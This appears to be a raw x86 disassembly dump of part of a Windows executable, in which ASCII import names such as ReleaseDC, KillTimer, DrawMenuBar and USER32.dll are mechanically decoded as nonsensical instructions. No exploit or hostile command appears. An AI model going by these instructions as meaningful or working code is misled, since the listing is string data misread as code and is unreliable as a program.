  412ac5:	outs   dx,BYTE PTR ds:[esi]
  412ac6:	outs   dx,WORD PTR ds:[esi]
  412ac8:	inc    ecx
  412ac9:	add    BYTE PTR [esi+0x2],cl
  412acc:	push   ebx
  412acd:	gs je  0x412b1d
  412ad0:	outs   dx,BYTE PTR gs:[esi]
  412ad2:	jne    0x412b1d
  412ad4:	je     0x412b3b
  412ad6:	ins    DWORD PTR es:[edi],dx
  412ad7:	dec    ecx
  412ad8:	outs   dx,BYTE PTR ds:[esi]
  412ad9:	outs   dx,WORD PTR ds:[esi]
  412adb:	push   edi
  412adc:	add    BYTE PTR [eax],al
  412ade:	adc    eax,0x6c655202
  412ae3:	gs popa 
  412ae5:	jae    0x412b4c
  412ae7:	inc    esp
  412ae8:	inc    ebx
  412ae9:	add    BYTE PTR [ecx+0x766e4901],cl
  412aef:	popa   
  412af0:	ins    BYTE PTR es:[edi],dx
  412af1:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  412af9:	je     0x412afb
  412afb:	add    BYTE PTR [edx+eax*1+0x74697753],al
  412b02:	arpl   WORD PTR [eax+0x54],bp
  412b05:	outs   dx,DWORD PTR ds:[esi]
  412b06:	push   esp
  412b07:	push   0x69577369
  412b0c:	outs   dx,BYTE PTR ds:[esi]
  412b0d:	outs   dx,DWORD PTR fs:[esi]
  412b0f:	ja     0x412b11
  412b11:	add    BYTE PTR [esi+0x6c694b01],ah
  412b17:	ins    BYTE PTR es:[edi],dx
  412b18:	push   esp
  412b19:	imul   ebp,DWORD PTR [ebp+0x65],0x2bd0072
  412b20:	imul   esp,DWORD PTR [ebp+0x79],0x62
  412b24:	fs pop edi
  412b26:	gs jbe 0x412b8e
  412b29:	outs   dx,BYTE PTR ds:[esi]
  412b2a:	je     0x412b2c
  412b2c:	cmp    eax,0x65684300
  412b31:	arpl   WORD PTR [ebx+0x52],bp
  412b34:	popa   
  412b35:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  412b3d:	outs   dx,BYTE PTR ds:[esi]
  412b3e:	add    BYTE PTR [eax],al
  412b40:	sahf   
  412b41:	add    DWORD PTR [ecx+0x73],ecx
  412b44:	push   edx
  412b45:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412b4a:	jo     0x412bc0
  412b4c:	jns    0x412b4e
  412b4e:	mov    es,WORD PTR [ecx]
  412b50:	dec    ecx
  412b51:	jae    0x412b96
  412b53:	push   0x6c417261
  412b58:	jo     0x412bc2
  412b5a:	popa   
  412b5b:	dec    esi
  412b5c:	jne    0x412bcb
  412b5e:	gs jb  0x412bca
  412b61:	arpl   WORD PTR [edi+0x0],dx
  412b64:	mov    ch,0x0
  412b66:	inc    esp
  412b67:	jb     0x412bca
  412b69:	ja     0x412bb8
  412b6b:	outs   dx,BYTE PTR gs:[esi]
  412b6d:	jne    0x412bb1
  412b6f:	popa   
  412b70:	jb     0x412b72
  412b72:	mov    BYTE PTR [edx],al
  412b74:	push   esp
  412b75:	popa   
  412b76:	bound  esp,QWORD PTR [edx+0x65]
  412b79:	fs push esp
  412b7b:	gs js  0x412bf2
  412b7e:	dec    edi
  412b7f:	jne    0x412bf5
  412b81:	push   edi
  412b82:	add    BYTE PTR [eax],al
  412b84:	or     eax,DWORD PTR [ecx]
  412b86:	inc    edi
  412b87:	gs je  0x412bce
  412b8a:	inc    ebx
  412b8b:	inc    ebp
  412b8c:	js     0x412b8e
  412b8e:	jno    0x412b92
  412b90:	push   ebx
  412b91:	gs je  0x412beb
  412b94:	imul   ebp,DWORD PTR [esi+0x64],0x6752776f
  412b9b:	outs   dx,BYTE PTR ds:[esi]
  412b9c:	add    BYTE PTR [eax],al
  412b9e:	xchg   ebx,eax
  412b9f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  412ba3:	je     0x412c17
  412ba5:	outs   dx,DWORD PTR ds:[esi]
  412ba6:	jns    0x412be9
  412ba8:	arpl   WORD PTR [ebx+0x65],sp
  412bab:	ins    BYTE PTR es:[edi],dx
  412bac:	gs jb  0x412c10
  412baf:	je     0x412c20
  412bb1:	jb     0x412c07
  412bb3:	popa   
  412bb4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412bb8:	push   edi
  412bb9:	add    dl,BYTE PTR [ebx+0x65]
  412bbc:	je     0x412c0e
  412bbe:	jb     0x412c2f
  412bc0:	jo     0x412c19
  412bc2:	add    BYTE PTR [eax],al
  412bc4:	sti    
  412bc5:	add    DWORD PTR [eax+0x74],edx
  412bc8:	dec    ecx
  412bc9:	outs   dx,BYTE PTR ds:[esi]
  412bca:	push   edx
  412bcb:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  412bd0:	push   0x74655302
  412bd5:	push   ebp
  412bd6:	jae    0x412c3d
  412bd8:	jb     0x412c29
  412bda:	bound  ebp,QWORD PTR [edx+0x65]
  412bdd:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  412be1:	outs   dx,WORD PTR ds:[esi]
  412be3:	jb     0x412c52
  412be5:	popa   
  412be6:	je     0x412c51
  412be8:	outs   dx,DWORD PTR ds:[esi]
  412be9:	outs   dx,BYTE PTR ds:[esi]
  412bea:	push   edi
  412beb:	add    dh,ch
  412bed:	add    DWORD PTR [eax+0x65],edx
  412bf0:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  412bf5:	jae    0x412c58
  412bf7:	addr16 gs inc ecx
  412bfa:	add    BYTE PTR [eax],al
  412bfc:	xor    eax,0x61684300
  412c01:	jb     0x412c57
  412c03:	outs   dx,DWORD PTR ds:[esi]
  412c04:	dec    edi
  412c05:	gs ins DWORD PTR es:[edi],dx
  412c07:	push   edi
  412c08:	add    BYTE PTR [eax],al
  412c0a:	add    BYTE PTR [ecx],0x49
  412c0d:	outs   dx,BYTE PTR ds:[esi]
  412c0e:	data16 ins BYTE PTR es:[edi],dx
  412c10:	popa   
  412c11:	je     0x412c78
  412c13:	push   edx
  412c14:	arpl   WORD PTR gs:[eax+eax*1-0x4d],si
  412c19:	add    BYTE PTR [edx+esi*2+0x61],al
  412c1d:	ja     0x412c68
  412c1f:	arpl   WORD PTR [edi+0x6e],bp
  412c22:	add    BYTE PTR [eax],al
  412c24:	mov    dl,0x0
  412c26:	inc    esp
  412c27:	jb     0x412c8a
  412c29:	ja     0x412c71
  412c2b:	jb     0x412c8e
  412c2d:	ins    DWORD PTR es:[edi],dx
  412c2e:	gs inc ebx
  412c30:	outs   dx,DWORD PTR ds:[esi]
  412c31:	outs   dx,BYTE PTR ds:[esi]
  412c32:	je     0x412ca6
  412c34:	outs   dx,DWORD PTR ds:[esi]
  412c35:	ins    BYTE PTR es:[edi],dx
  412c36:	add    BYTE PTR [eax],al
  412c38:	inc    edx
  412c39:	add    DWORD PTR [edi+0x65],eax
  412c3c:	je     0x412c8c
  412c3e:	gs js  0x412cb5
  412c41:	inc    esp
  412c42:	ins    BYTE PTR es:[edi],dx
  412c43:	addr16 inc edi
  412c45:	jb     0x412cb6
  412c47:	jne    0x412cb9
  412c49:	dec    ecx
  412c4a:	je     0x412cb1
  412c4c:	ins    DWORD PTR es:[edi],dx
  412c4d:	add    BYTE PTR ds:0x6e655302,ah
  412c53:	fs dec ecx
  412c55:	outs   dx,BYTE PTR ds:[esi]
  412c56:	jo     0x412ccd
  412c58:	je     0x412c5a
  412c5a:	mov    DWORD PTR [eax],eax
  412c5c:	inc    esp
  412c5d:	gs inc si
  412c60:	jb     0x412cc3
  412c62:	ins    DWORD PTR es:[edi],dx
  412c63:	gs push eax
  412c65:	jb     0x412cd6
  412c67:	arpl   WORD PTR [ecx+0x0],ax
  412c6a:	mov    es,WORD PTR [eax]
  412c6c:	inc    esp
  412c6d:	gs push di
  412c70:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  412c77:	outs   dx,DWORD PTR ds:[esi]
  412c78:	arpl   WORD PTR [ecx+0x0],ax
  412c7b:	add    BYTE PTR [eax+eax*1+0x6c616944],bl
  412c82:	outs   dx,DWORD PTR ds:[esi]
  412c83:	addr16 inc edx
  412c85:	outs   dx,DWORD PTR ds:[esi]
  412c86:	js     0x412cd8
  412c88:	popa   
  412c89:	jb     0x412cec
  412c8b:	ins    DWORD PTR es:[edi],dx
  412c8c:	inc    ecx
  412c8d:	add    BYTE PTR [edx],al
  412c8f:	add    dl,BYTE PTR [edx+0x65]
  412c92:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  412c9a:	popa   
  412c9b:	jae    0x412d10
  412c9d:	inc    ecx
  412c9e:	add    BYTE PTR [eax],al
  412ca0:	dec    edx
  412ca1:	add    BYTE PTR [ebx+0x6f],al
  412ca4:	jo     0x412d1f
  412ca6:	inc    ecx
  412ca7:	arpl   WORD PTR [ebx+0x65],sp
  412caa:	ins    BYTE PTR es:[edi],dx
  412cab:	gs jb  0x412d0f
  412cae:	je     0x412d1f
  412cb0:	jb     0x412d06
  412cb2:	popa   
  412cb3:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cb7:	add    BYTE PTR [ebx+0x1],bl
  412cba:	inc    edi
  412cbb:	gs je  0x412d11
  412cbe:	jns    0x412d33
  412cc0:	je     0x412d27
  412cc2:	ins    DWORD PTR es:[edi],dx
  412cc3:	dec    ebp
  412cc4:	outs   dx,BYTE PTR gs:[esi]
  412cc6:	jne    0x412cc8
  412cc8:	mov    eax,0x61724400
  412ccd:	ja     0x412d22
  412ccf:	je     0x412d32
  412cd1:	je     0x412d38
  412cd3:	push   edi
  412cd4:	add    BYTE PTR [eax],al
  412cd6:	loope  0x412cd8
  412cd8:	inc    esi
  412cd9:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  412ce0:	outs   dx,DWORD PTR ds:[esi]
  412ce1:	ja     0x412d24
  412ce3:	add    BYTE PTR [edx+0x0],ah
  412ce6:	inc    ebx
  412ce7:	jb     0x412d4e
  412ce9:	popa   
  412cea:	je     0x412d51
  412cec:	push   edi
  412ced:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412cf4:	inc    ecx
  412cf5:	add    cl,al
  412cf7:	add    BYTE PTR [ebp+0x6e],al
  412cfa:	popa   
  412cfb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cff:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412d06:	cmp    DWORD PTR [eax],eax
  412d08:	inc    ebx
  412d09:	push   0x70557261
  412d0e:	jo     0x412d75
  412d10:	jb     0x412d69
  412d12:	add    BYTE PTR [eax],al
  412d14:	or     al,BYTE PTR [edx]
  412d16:	push   edx
  412d17:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6f487265
  412d20:	je     0x412d6d
  412d22:	gs jns 0x412d25
  412d25:	add    BYTE PTR [ebx],al
  412d27:	add    BYTE PTR [ecx+0x64],al
  412d2a:	push   0x75
  412d2c:	jae    0x412da2
  412d2e:	push   edi
  412d2f:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  412d36:	arpl   WORD PTR [ebp+eax*2+0x78],si
  412d3a:	add    BYTE PTR [eax],al
  412d3c:	aad    0x1
  412d3e:	dec    ebp
  412d3f:	gs jae 0x412db5
  412d42:	popa   
  412d43:	addr16 gs inc edx
  412d46:	outs   dx,DWORD PTR ds:[esi]
  412d47:	js     0x412da0
  412d49:	add    bh,cl
  412d4b:	add    DWORD PTR [ebp+0x65],ecx
  412d4e:	jae    0x412dc3
  412d50:	popa   
  412d51:	addr16 gs inc edx
  412d54:	outs   dx,DWORD PTR ds:[esi]
  412d55:	js     0x412d9c
  412d57:	js     0x412d9a
  412d59:	add    BYTE PTR [edx+0x1],ah
  412d5c:	inc    edi
  412d5d:	gs je  0x412db4
  412d60:	outs   dx,DWORD PTR ds:[esi]
  412d61:	jo     0x412dba
  412d63:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412d6a:	dec    eax
  412d6b:	add    dl,BYTE PTR [ebx+0x65]
  412d6e:	je     0x412dbd
  412d70:	outs   dx,BYTE PTR gs:[esi]
  412d72:	jne    0x412d74
  412d74:	loop   0x412d76
  412d76:	inc    esi
  412d77:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  412d7e:	outs   dx,DWORD PTR ds:[esi]
  412d7f:	ja     0x412dc6
  412d81:	js     0x412dc4
  412d83:	add    BYTE PTR [esi+0x616f4c01],dh
  412d89:	fs dec ebp
  412d8b:	outs   dx,BYTE PTR gs:[esi]
  412d8d:	jne    0x412dd0
  412d8f:	add    dh,cl
  412d91:	add    DWORD PTR [ebp+0x65],ecx
  412d94:	jae    0x412e09
  412d96:	popa   
  412d97:	addr16 gs inc edx
  412d9a:	outs   dx,DWORD PTR ds:[esi]
  412d9b:	js     0x412dde
  412d9d:	add    ch,bl
  412d9f:	add    BYTE PTR [ebp+0x71],al
  412da2:	jne    0x412e05
  412da4:	ins    BYTE PTR es:[edi],dx
  412da5:	push   edx
  412da6:	arpl   WORD PTR gs:[eax+eax*1-0x72],si
  412dab:	add    dl,BYTE PTR [edi+ebp*2+0x55]
  412daf:	outs   dx,BYTE PTR ds:[esi]
  412db0:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  412db7:	add    BYTE PTR [edi+0x1],dh
  412dba:	inc    edi
  412dbb:	gs je  0x412e15
  412dbe:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  412dc5:	js     0x412e3b
  412dc7:	dec    esp
  412dc8:	outs   dx,BYTE PTR gs:[esi]
  412dca:	addr16 je 0x412e35
  412dcd:	push   edi
  412dce:	add    BYTE PTR [eax],al
  412dd0:	mov    al,BYTE PTR [edx]
  412dd2:	push   esp
  412dd3:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x6f646e69
  412ddb:	ja     0x412e50
  412ddd:	add    dh,bh
  412ddf:	add    BYTE PTR [edi+0x65],al
  412de2:	je     0x412e27
  412de4:	ins    BYTE PTR es:[edi],dx
  412de5:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  412dec:	jb     0x412dee
  412dee:	les    eax,FWORD PTR [ecx]
  412df0:	dec    ebp
  412df1:	popa   
  412df2:	jo     0x412e38
  412df4:	imul   esp,DWORD PTR [ecx+0x6c],0x6552676f
  412dfb:	arpl   WORD PTR [eax+eax*1-0x45],si
  412dff:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412e03:	fs push ebx
  412e05:	je     0x412e79
  412e07:	imul   ebp,DWORD PTR [esi+0x67],0x17e0041
  412e0e:	dec    eax
  412e0f:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x6e654d65
  412e17:	jne    0x412e62
  412e19:	je     0x412e80
  412e1b:	ins    DWORD PTR es:[edi],dx
  412e1c:	add    BYTE PTR [eax],al
  412e1e:	xor    al,BYTE PTR [ecx]
  412e20:	inc    edi
  412e21:	gs je  0x412e71
  412e24:	outs   dx,BYTE PTR gs:[esi]
  412e26:	jne    0x412e71
  412e28:	je     0x412e8f
  412e2a:	ins    DWORD PTR es:[edi],dx
  412e2b:	inc    ebx
  412e2c:	outs   dx,DWORD PTR ds:[esi]
  412e2d:	jne    0x412e9d
  412e2f:	je     0x412e31
  412e31:	add    cl,al
  412e33:	add    DWORD PTR [edi+ebp*2+0x6f],ecx
  412e37:	imul   esi,DWORD PTR [ebp+0x70],0x49
  412e3b:	arpl   WORD PTR [edi+0x6e],bp
  412e3e:	dec    ecx
  412e3f:	fs inc esi
  412e41:	jb     0x412eb2
  412e43:	ins    DWORD PTR es:[edi],dx
  412e44:	inc    esp
  412e45:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  412e4c:	jns    0x412e4e
  412e4e:	mov    BYTE PTR [ecx],al
  412e50:	dec    ecx
  412e51:	outs   dx,BYTE PTR ds:[esi]
  412e52:	je     0x412eb9
  412e54:	jb     0x412ec9
  412e56:	arpl   WORD PTR gs:[edx+edx*2+0x65],si
  412e5b:	arpl   WORD PTR [eax+eax*1+0x13],si
  412e5f:	add    DWORD PTR [edi+0x65],eax
  412e62:	je     0x412ea8
  412e64:	outs   dx,DWORD PTR ds:[esi]
  412e65:	jne    0x412ec9
  412e67:	ins    BYTE PTR es:[edi],dx
  412e68:	gs inc ebx
  412e6a:	ins    BYTE PTR es:[edi],dx
  412e6b:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  412e72:	add    BYTE PTR [eax],al
  412e74:	daa    
  412e75:	add    DWORD PTR [edi+0x65],eax
  412e78:	je     0x412ec5
  412e7a:	gs jns 0x412edf
  412e7d:	outs   dx,DWORD PTR ds:[esi]
  412e7e:	popa   
  412e7f:	jb     0x412ee5
  412e81:	push   esp
  412e82:	jns    0x412ef4
  412e84:	gs add al,dh
  412e87:	add    BYTE PTR [edi+0x65],al
  412e8a:	je     0x412ecd
  412e8c:	jae    0x412f07
  412e8e:	outs   dx,BYTE PTR ds:[esi]
  412e8f:	arpl   WORD PTR [ebx+0x65],cx
  412e92:	jns    0x412ee7
  412e94:	je     0x412ef7
  412e96:	je     0x412efd
  412e98:	add    BYTE PTR [eax],al
  412e9a:	sub    BYTE PTR [eax],al
  412e9c:	inc    ebx
  412e9d:	push   0x6f4c7261
  412ea2:	ja     0x412f09
  412ea4:	jb     0x412ee8
  412ea6:	jne    0x412f0e
  412ea8:	push   di
  412eaa:	add    BYTE PTR [eax],al
  412eac:	popf   
  412ead:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412eb1:	ins    BYTE PTR es:[edi],dx
  412eb2:	outs   dx,DWORD PTR ds:[esi]
  412eb3:	addr16 inc edx
  412eb5:	outs   dx,DWORD PTR ds:[esi]
  412eb6:	js     0x412f08
  412eb8:	popa   
  412eb9:	jb     0x412f1c
  412ebb:	ins    DWORD PTR es:[edi],dx
  412ebc:	push   edi
  412ebd:	add    BYTE PTR [ecx],ch
  412ebf:	add    BYTE PTR [ebx+0x68],al
  412ec2:	popa   
  412ec3:	jb     0x412f11
  412ec5:	outs   dx,DWORD PTR ds:[esi]
  412ec6:	ja     0x412f2d
  412ec8:	jb     0x412f21
  412eca:	add    BYTE PTR [eax],al
  412ecc:	and    al,0x0
  412ece:	inc    ebx
  412ecf:	push   0x65676e61
  412ed4:	dec    ebp
  412ed5:	outs   dx,BYTE PTR gs:[esi]
  412ed7:	jne    0x412f30
  412ed9:	add    BYTE PTR [edi+0x636f4c01],bh
  412edf:	imul   edx,DWORD PTR [edi+0x69],0x6e
  412ee3:	outs   dx,DWORD PTR fs:[esi]
  412ee5:	ja     0x412f3c
  412ee7:	jo     0x412f4d
  412ee9:	popa   
  412eea:	je     0x412f51
  412eec:	add    BYTE PTR [eax],al
  412eee:	mov    al,ds:0x57734901
  412ef3:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412efa:	mov    DWORD PTR [ecx],0x5670614d
  412f00:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  412f07:	gs jns 0x412f4f
  412f0a:	js     0x412f63
  412f0c:	add    BYTE PTR [eax],al
  412f0e:	pop    ecx
  412f0f:	add    dl,BYTE PTR [ebx+0x65]
  412f12:	je     0x412f66
  412f14:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412f19:	jo     0x412f8f
  412f1b:	jns    0x412f1d
  412f1d:	add    al,bh
  412f1f:	add    BYTE PTR [edi+0x65],al
  412f22:	je     0x412f67
  412f24:	ins    BYTE PTR es:[edi],dx
  412f25:	popa   
  412f26:	jae    0x412f9b
  412f28:	dec    esp
  412f29:	outs   dx,DWORD PTR ds:[esi]
  412f2a:	outs   dx,BYTE PTR ds:[esi]
  412f2b:	addr16 inc ecx
  412f2d:	add    cl,cl
  412f2f:	add    DWORD PTR [ebp+0x61],ecx
  412f32:	jo     0x412f8b
  412f34:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  412f3b:	imul   ebp,DWORD PTR [esi+0x74],0x2930073
  412f42:	push   esp
  412f43:	jb     0x412fa6
  412f45:	outs   dx,BYTE PTR ds:[esi]
  412f46:	jae    0x412fb4
  412f48:	popa   
  412f49:	je     0x412fb0
  412f4b:	inc    ecx
  412f4c:	arpl   WORD PTR [ebx+0x65],sp
  412f4f:	ins    BYTE PTR es:[edi],dx
  412f50:	gs jb  0x412fb4
  412f53:	je     0x412fc4
  412f55:	jb     0x412f98
  412f57:	add    BYTE PTR [eax+eax*1],bh
  412f5a:	inc    ebx
  412f5b:	push   0x4d6b6365
  412f60:	outs   dx,BYTE PTR gs:[esi]
  412f62:	jne    0x412fb6
  412f64:	popa   
  412f65:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  412f6d:	add    BYTE PTR [edx+0x2],bl
  412f70:	push   ebx
  412f71:	gs je  0x412fc7
  412f74:	arpl   WORD PTR [edx+0x6f],si
  412f77:	ins    BYTE PTR es:[edi],dx
  412f78:	ins    BYTE PTR es:[edi],dx
  412f79:	dec    ecx
  412f7a:	outs   dx,BYTE PTR ds:[esi]
  412f7b:	outs   dx,WORD PTR ds:[esi]
  412f7d:	add    BYTE PTR ds:0x6c6c4100,al
  412f83:	outs   dx,DWORD PTR ds:[esi]
  412f84:	ja     0x412fd9
  412f86:	gs je  0x412fcf
  412f89:	outs   dx,DWORD PTR ds:[esi]
  412f8a:	jb     0x412ff1
  412f8c:	addr16 jb 0x412ffe
  412f8f:	jne    0x412fff
  412f91:	fs push edi
  412f93:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412f9a:	lahf   
  412f9b:	add    BYTE PTR [ecx+ebp*2+0x73],al
  412f9f:	jo     0x413002
  412fa1:	je     0x413006
  412fa3:	push   0x7373654d
  412fa8:	popa   
  412fa9:	addr16 gs inc ecx
  412fac:	add    BYTE PTR [eax],al
  412fae:	sub    eax,0x61684300
  412fb3:	jb     0x413003
  412fb5:	gs js  0x41302c
  412fb8:	push   edi
  412fb9:	add    bh,ah
  412fbb:	add    BYTE PTR [esi+0x72],al
  412fbe:	popa   
  412fbf:	ins    DWORD PTR es:[edi],dx
  412fc0:	gs push edx
  412fc2:	arpl   WORD PTR gs:[eax+eax*1-0x1c],si
  412fc7:	add    DWORD PTR [edi+0x66],ecx
  412fca:	data16 jae 0x413032
  412fcd:	je     0x413021
  412fcf:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  412fd4:	mov    al,BYTE PTR [ecx]
  412fd6:	dec    ecx
  412fd7:	outs   dx,BYTE PTR ds:[esi]
  412fd8:	jbe    0x41303b
  412fda:	ins    BYTE PTR es:[edi],dx
  412fdb:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x6e675265
  412fe3:	add    BYTE PTR [edx+0x2],al
  412fe6:	push   ebx
  412fe7:	gs je  0x413030
  412fea:	outs   dx,DWORD PTR ds:[esi]
  412feb:	jb     0x413052
  412fed:	addr16 jb 0x41305f
  412ff0:	jne    0x413060
  412ff2:	fs push edi
  412ff4:	imul   ebp,DWORD PTR [esi+0x64],0x2f00776f
  412ffb:	add    dl,BYTE PTR [ebx+0x65]
  412ffe:	je     0x413041
  413000:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  413004:	gs push edi
  413006:	imul   ebp,DWORD PTR [esi+0x64],0x9400776f
  41300d:	add    DWORD PTR [ecx+0x73],ecx
  413010:	inc    ebx
  413011:	push   0x646c69
  413016:	fwait
  413017:	add    dl,BYTE PTR [ebp+0x6e]
  41301a:	ins    BYTE PTR es:[edi],dx
  41301b:	outs   dx,DWORD PTR ds:[esi]
  41301c:	popa   
  41301d:	fs dec ebx
  41301f:	gs jns 0x413084
  413022:	outs   dx,DWORD PTR ds:[esi]
  413023:	popa   
  413024:	jb     0x41308a
  413026:	dec    esp
  413027:	popa   
  413028:	jns    0x413099
  41302a:	jne    0x4130a0
  41302c:	add    BYTE PTR [eax],al
  41302e:	pushf  
  41302f:	add    DWORD PTR [ecx+0x73],ecx
  413032:	dec    ecx
  413033:	arpl   WORD PTR [edi+0x6e],bp
  413036:	imul   esp,DWORD PTR [ebx+0x0],0x47013800
  41303d:	gs je  0x41308d
  413040:	outs   dx,BYTE PTR gs:[esi]
  413042:	jne    0x413097
  413044:	je     0x4130b8
  413046:	imul   ebp,DWORD PTR [esi+0x67],0xb9000041
  41304d:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  413051:	fs dec ebp
  413053:	outs   dx,BYTE PTR gs:[esi]
  413055:	jne    0x4130ae
  413057:	add    BYTE PTR [ebx],dl
  413059:	add    dl,BYTE PTR [edx+0x65]
  41305c:	imul   esi,DWORD PTR [bp+di+0x74],0x69577265
  413064:	outs   dx,BYTE PTR ds:[esi]
  413065:	outs   dx,DWORD PTR fs:[esi]
  413067:	ja     0x4130b6
  413069:	gs jae 0x4130df
  41306c:	popa   
  41306d:	addr16 gs push edi
  413070:	add    BYTE PTR [eax],al
  413072:	cmp    BYTE PTR [edx],al
  413074:	push   ebx
  413075:	gs je  0x4130bb
  413078:	jne    0x4130ec
  41307a:	jae    0x4130eb
  41307c:	jb     0x41307e
  41307e:	add    DWORD PTR ds:[edi+0x65],eax
  413082:	je     0x4130d1
  413084:	gs jae 0x4130fa
  413087:	popa   
  413088:	addr16 gs push edi
  41308b:	add    BYTE PTR ds:0x74654701,dl
  413091:	inc    esi
  413092:	outs   dx,DWORD PTR ds:[esi]
  413093:	jb     0x4130fa
  413095:	addr16 jb 0x413107
  413098:	jne    0x413108
  41309a:	fs push edi
  41309c:	imul   ebp,DWORD PTR [esi+0x64],0x5900776f
  4130a3:	add    BYTE PTR [ebx+0x72],al
  4130a6:	gs popa 
  4130a8:	je     0x41310f
  4130aa:	inc    esp
  4130ab:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  4130b2:	jb     0x413115
  4130b4:	ins    DWORD PTR es:[edi],dx
  4130b5:	push   edi
  4130b6:	add    BYTE PTR [eax],al
  4130b8:	stc    
  4130b9:	add    BYTE PTR [edi+0x65],al
  4130bc:	je     0x413101
  4130be:	ins    BYTE PTR es:[edi],dx
  4130bf:	popa   
  4130c0:	jae    0x413135
  4130c2:	dec    esp
  4130c3:	outs   dx,DWORD PTR ds:[esi]
  4130c4:	outs   dx,BYTE PTR ds:[esi]
  4130c5:	addr16 push edi
  4130c7:	add    BYTE PTR [ebp+0x53],dl
  4130ca:	inc    ebp
  4130cb:	push   edx
  4130cc:	xor    esi,DWORD PTR [edx]
  4130ce:	cs fs ins BYTE PTR es:[edi],dx
  4130d1:	ins    BYTE PTR es:[edi],dx
  4130d2:	add    BYTE PTR [eax],al
  4130d4:	mov    ah,0x3
  4130d6:	push   edx
  4130d7:	gs ins DWORD PTR es:[edi],dx
  4130d9:	outs   dx,DWORD PTR ds:[esi]
  4130da:	jbe    0x413141
  4130dc:	inc    esp
  4130dd:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4130e4:	jns    0x41313d
  4130e6:	add    BYTE PTR [eax],al
  4130e8:	add    al,0x3
  4130ea:	dec    esp
  4130eb:	gs popa 
  4130ed:	jbe    0x413154
  4130ef:	inc    ebx
  4130f0:	jb     0x41315b
  4130f2:	je     0x41315d
  4130f4:	arpl   WORD PTR [ecx+0x6c],sp
  4130f7:	push   ebx
  4130f8:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4130fd:	outs   dx,BYTE PTR ds:[esi]
  4130fe:	add    BYTE PTR [eax],al
  413100:	pop    ss
  413101:	add    al,0x53
  413103:	gs je  0x41314c
  413106:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  41310e:	bound  esi,QWORD PTR [ebp+0x74]
  413111:	gs jae 0x41316b
  413114:	add    BYTE PTR [eax],al
  413116:	xchg   BYTE PTR [esi+edx*2],al
  413119:	imul   esi,DWORD PTR [edx+0x74],0x516c6175
  413120:	jne    0x413187
  413122:	jb     0x41319d
  413124:	add    BYTE PTR [eax],al
  413126:	mov    ds:0x61654802,eax
  41312b:	jo     0x413170
  41312d:	jb     0x413194
  41312f:	popa   
  413130:	je     0x413197
  413132:	add    BYTE PTR [eax],al
  413134:	or     BYTE PTR [ebx+edx*2],al
  413137:	gs je  0x41317d
  41313a:	jne    0x4131ae
  41313c:	jb     0x4131a3
  41313e:	outs   dx,BYTE PTR ds:[esi]
  41313f:	je     0x413185
  413141:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  413148:	jns    0x41318b
  41314a:	add    BYTE PTR [eax],al
  41314c:	cmp    BYTE PTR [ebx],al
  41314e:	dec    edi
  41314f:	jo     0x4131b6
  413151:	outs   dx,BYTE PTR ds:[esi]
  413152:	inc    ebp
  413153:	jbe    0x4131ba
  413155:	outs   dx,BYTE PTR ds:[esi]
  413156:	je     0x413199
  413158:	add    BYTE PTR [eax],al
  41315a:	dec    ebp
  41315b:	add    eax,0x7274736c
  413160:	ins    BYTE PTR es:[edi],dx
  413161:	outs   dx,BYTE PTR gs:[esi]
  413163:	inc    ecx
  413164:	add    BYTE PTR [eax],al
  413166:	add    al,BYTE PTR [bx+0x65]
  41316a:	je     0x4131c0
  41316c:	push   0x64616572
  413171:	dec    esp
  413172:	outs   dx,DWORD PTR ds:[esi]
  413173:	arpl   WORD PTR [ecx+0x6c],sp
  413176:	add    BYTE PTR gs:[ebx+0x4],ch
  41317a:	push   ebp
  41317b:	outs   dx,BYTE PTR ds:[esi]
  41317c:	push   0x6c646e61
  413181:	gs fs inc ebp
  413184:	js     0x4131e9
  413186:	gs jo  0x4131fd
  413189:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  413190:	gs jb  0x413193
  413193:	add    BYTE PTR [ecx+0x72695604],al
  413199:	je     0x413210
  41319b:	popa   
  41319c:	ins    BYTE PTR es:[edi],dx
  41319d:	inc    esi
  41319e:	jb     0x413205
  4131a0:	add    BYTE PTR gs:[edi+0x74654701],bl
  4131a7:	inc    ebx
  4131a8:	outs   dx,DWORD PTR ds:[esi]
